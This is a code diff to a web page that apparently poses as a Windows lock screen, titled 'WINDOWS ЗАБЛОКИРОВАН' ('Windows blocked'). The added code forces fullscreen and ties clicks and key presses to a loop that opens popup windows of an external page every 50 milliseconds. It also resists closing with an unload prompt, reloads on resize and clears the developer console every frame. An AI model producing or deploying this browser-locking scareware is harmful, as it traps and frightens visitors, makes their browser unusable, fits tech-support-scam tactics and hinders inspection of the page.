@@ -38,12 +38,11 @@
 	function FS() {
 		clicked = true
 		document.title = 'WINDOWS ЗАБЛОКИРОВАН'
-		//launchFullScreen()
+		document.documentElement.requestFullscreen();
 		var randomnumber = Math.floor((Math.random()*100)+1); 
 		window.open("http://applevegas.github.io/look.html","_blank",'PopUp',randomnumber,'scrollbars=1,menubar=0,resizable=1,width=850,height=500');
 	}
-	document.documentElement.onclick = FS;
-    document.onkeydown = FS;
+	
 	window.onbeforeunload = function(){
 		return 'No?';
 	};
@@ -54,11 +53,11 @@
 	var timeoutId = null;
 	function lol() {
 		FS()
-		soundd.play()
 		window.open("http://applevegas.github.io/look.html","newwindow");
 		timeoutId = setTimeout(lol, 50);
 	}
-
+	document.documentElement.onclick = lol;
+    document.onkeydown = lol;
 	const canvas = document.getElementById('seed')
 	var w = $(window).width();
 	var h = $(window).height();
@@ -112,6 +111,29 @@
 	image.onload = ImageLoaded; 
 	image.src = 'sbac.jpg';
 	changeResolution(canvas, w, h)
+
+	$(window).resize(function(){
+    	w = $(window).width();
+    	h = $(window).height();
+
+    	if (mode == 1 && w < h){
+    	    document.location.reload()
+    	}
+
+    	if (mode == 0 && w > h){
+    	    document.location.reload()
+    	}
+
+    	if (mode == 1)
+    	{
+    	    screenscale = ScreenScale(1366)
+    	}else{
+    	    screenscale = ScreenScaleH(657)
+    	}
+
+    	changeResolution(canvas, w, h)
+	});
+
 	const ctx = canvas.getContext('2d')
 	function draw(time){
 		ctx.clearRect(0, 0, w, h);
@@ -132,6 +154,7 @@
 				ctx.drawImage(image, w/2 - s488/2, h/2 - s308/2, s488, s308);
 			} 
 		}
+		console.clear()
 		requestAnimationFrame(draw);
 	}
 	requestAnimationFrame(draw);
